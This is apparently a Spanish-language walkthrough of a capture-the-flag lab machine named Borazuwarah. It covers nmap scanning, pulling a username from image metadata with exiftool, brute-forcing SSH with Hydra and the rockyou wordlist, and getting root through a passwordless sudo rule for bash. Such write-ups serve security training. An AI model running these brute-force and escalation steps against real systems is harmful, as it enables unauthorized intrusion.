# Explotación de la máquina Borazuwarah

## Información general
- **Nombre de la máquina**: Borazuwarah
- **Dirección IP**: 172.17.0.2
- **Puntos de entrada**: HTTP (puerto 80), SSH (puerto 22)

## Reconocimiento
Realizamos un escaneo de puertos, servicios y versiones con el siguiente comando.

```bash
sudo nmap -sV -sC 172.17.0.2

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 12:45 -05
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
|_  256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
Nos muestra que solo tenemos el 22 de ssh y el 80 con apache.

Primero revisamos la pagina web.

Vemos que solo hay una imagen y no hay comentarios ni nada asi que descargamos la imagen por si esconde algo

## Exiftool

Usaremos la herramienta exiftool para ver los detalles de la imagen 

```bash
exiftool img.jpeg                      

```
```                                           
ExifTool Version Number         : 12.76
File Name                       : img.jpeg
Directory                       : .
File Size                       : 19 kB
File Modification Date/Time     : 2024:12:04 22:53:30-05:00
File Access Date/Time           : 2024:12:04 22:54:55-05:00
File Inode Change Date/Time     : 2024:12:04 22:53:30-05:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 12.76
Description                     : ---------- User: borazuwarah ----------
Title                           : ---------- Password:  ----------
Image Width                     : 455
Image Height                    : 455
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 455x455
Megapixels                      : 0.207

```
Genial escondia un nombre de usuario , ahora con ese nombre de usuario podemos lanzar hydra , recordemos que esta el puerto 22 abierto.

```bash 
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-05 12:49:03
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-05 12:49:09

```
No tarda nada en devolvernos un password , pasamos a conectar por ssh.

```bash

ssh borazuwarah@172.17.0.2 
borazuwarah@172.17.0.2's password: 
Linux e8dd44607fdf 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

```
Una vez conectados buscamos como escalar yo siempre ejecuto sudo -l primero.

```bash 
Matching Defaults entries for borazuwarah on e8dd44607fdf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User borazuwarah may run the following commands on e8dd44607fdf:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

Como vemos podemos ejecutar bash con permisos elevados.

```bash 
sudo bash

root@e8dd44607fdf:/home/borazuwarah# whoami
root
```
Llegamos al final somos root!!!

